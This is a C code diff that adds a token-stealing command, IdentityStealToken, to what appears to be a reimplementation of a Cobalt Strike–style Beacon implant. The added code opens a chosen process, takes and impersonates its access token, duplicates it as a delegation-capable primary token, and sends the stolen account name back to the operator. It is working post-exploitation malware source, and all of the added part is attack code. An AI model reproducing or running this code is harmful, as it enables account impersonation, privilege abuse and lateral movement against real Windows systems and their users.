@@ -283,3 +283,71 @@ void IdentityLoginUser(char* buffer, int length)
 	IdentityLoginUserInternal(domain, username, password);
 	BeaconDataFree(locals);
 }
+
+void IdentityStealToken(char* buffer, int length)
+{
+	int pid;
+
+	if (length != sizeof(pid))
+		return;
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	pid = BeaconDataInt(&parser);
+
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+
+	if (!hProcess)
+	{
+		int lastError = GetLastError();
+		LERROR("Could not open process %d: %s", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_OPEN_PROCESS_FAILED, pid, lastError);
+		return;
+	}
+
+	HANDLE hToken;
+	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
+	{
+		int lastError = GetLastError();
+		LERROR("Could not open process token: %d (%s)", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_OPEN_PROCESS_TOKEN_FAILED, pid, lastError);		
+		return;
+	}
+
+	BeaconRevertToken();
+
+	if (!ImpersonateLoggedOnUser(hToken))
+	{
+		int lastError = GetLastError();
+		LERROR("Failed to impersonate token from %d (%s)", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_IMPERSONATE_STEAL_TOKEN_FAILED, pid, lastError);
+		return;
+	}
+
+	if(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken))
+	{
+		int lastError = GetLastError();
+		LERROR("Failed to duplicate token from %d (%s)", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_DUPLICATE_TOKEN_FAILED, pid, lastError);
+		return;
+	}
+
+	if (!ImpersonateLoggedOnUser(gIdentityToken))
+	{
+		int lastError = GetLastError();
+		LERROR("Failed to impersonate logged on user %d (%s)", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_IMPERSONATE_LOGGED_ON_USER_FAILED, pid, lastError);
+		return;
+	}
+
+	CloseHandle(hProcess);
+
+	if (hToken)
+		CloseHandle(hToken);
+
+	char accountName[0x200];
+	if (IdentityGetUserInfo(gIdentityToken, accountName, sizeof(accountName)))
+	{
+		BeaconOutput(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName));
+	}
+}
